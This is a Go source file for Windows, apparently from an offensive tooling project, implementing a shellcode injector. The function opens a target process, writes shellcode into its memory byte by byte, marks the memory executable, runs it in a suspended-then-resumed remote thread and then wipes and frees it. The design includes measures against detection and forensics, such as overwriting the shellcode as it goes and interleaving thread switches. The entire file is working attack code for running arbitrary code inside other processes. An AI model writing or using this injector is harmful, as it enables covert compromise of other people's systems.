// +build windows

package injector

import (
	"context"
	"time"

	"github.com/pkg/errors"
	"golang.org/x/sys/windows"

	"project/internal/module/windows/api"
	"project/internal/random"
	"project/internal/security"
)

// InjectShellcode is used to inject shellcode to a process.
// It will block until shellcode execute finish.
// warning: shellcode slice will be covered.
func InjectShellcode(pid uint32, shellcode []byte) error {
	defer security.CoverBytes(shellcode)
	// open target process
	const da = windows.PROCESS_CREATE_THREAD | windows.PROCESS_QUERY_INFORMATION |
		windows.PROCESS_VM_OPERATION | windows.PROCESS_VM_WRITE |
		windows.PROCESS_VM_READ | windows.SYNCHRONIZE
	pHandle, err := api.OpenProcess(da, false, pid)
	if err != nil {
		return err
	}
	defer func() { api.CloseHandle(pHandle) }()

	// alloc memory for shellcode
	doneVA := security.SwitchThreadAsync()
	scSize := uintptr(len(shellcode))
	const memType = windows.MEM_COMMIT | windows.MEM_RESERVE
	memAddr, err := api.VirtualAllocEx(pHandle, 0, scSize, memType, windows.PAGE_READWRITE)
	if err != nil {
		return err
	}
	// create remote thread first and suspend
	doneCRT := security.SwitchThreadAsync()
	const creationFlags = windows.CREATE_SUSPENDED
	tHandle, _, err := api.CreateRemoteThread(pHandle, nil, 0, memAddr, nil, creationFlags)
	if err != nil {
		return err
	}
	defer func() { api.CloseHandle(tHandle) }()
	// write shellcode
	doneWPM := security.SwitchThreadAsync()
	rand := random.NewRand()
	for i := uintptr(0); i < scSize; i++ {
		index := int(i)
		_, err = api.WriteProcessMemory(pHandle, memAddr+i, []byte{shellcode[index]})
		if err != nil {
			return errors.WithMessage(err, "failed to write shellcode to target process")
		}
		// cover shellcode at once
		shellcode[index] = byte(rand.Int64())
	}
	// set shellcode page execute
	doneVP := security.SwitchThreadAsync()
	oldProtect := new(uint32)
	err = api.VirtualProtectEx(pHandle, memAddr, scSize, windows.PAGE_EXECUTE, oldProtect)
	if err != nil {
		return err
	}
	// resume thread for execute shellcode
	doneRT := security.SwitchThreadAsync()
	_, err = windows.ResumeThread(tHandle)
	if err != nil {
		return errors.Wrap(err, "failed to resume thread")
	}
	// wait thread switch
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()
	security.WaitSwitchThreadAsync(ctx, doneVA, doneCRT, doneWPM, doneVP, doneRT)
	// wait thread for wait shellcode execute finish
	_, err = windows.WaitForSingleObject(tHandle, windows.INFINITE)
	if err != nil {
		return errors.Wrap(err, "failed to wait thread")
	}
	// clean shellcode and free it
	doneVP = security.SwitchThreadAsync()
	err = api.VirtualProtectEx(pHandle, memAddr, scSize, windows.PAGE_READWRITE, oldProtect)
	if err != nil {
		return err
	}
	// cover raw shellcode
	doneWPM = security.SwitchThreadAsync()
	_, err = api.WriteProcessMemory(pHandle, memAddr, rand.Bytes(int(scSize)))
	if err != nil {
		return errors.WithMessage(err, "failed to cover shellcode to target process")
	}
	// free memory
	doneVF := security.SwitchThreadAsync()
	err = api.VirtualFreeEx(pHandle, memAddr, 0, windows.MEM_RELEASE)
	if err != nil {
		return errors.Wrap(err, "failed to release covered memory")
	}
	ctx, cancel = context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()
	security.WaitSwitchThreadAsync(ctx, doneVP, doneWPM, doneVF)
	return nil
}
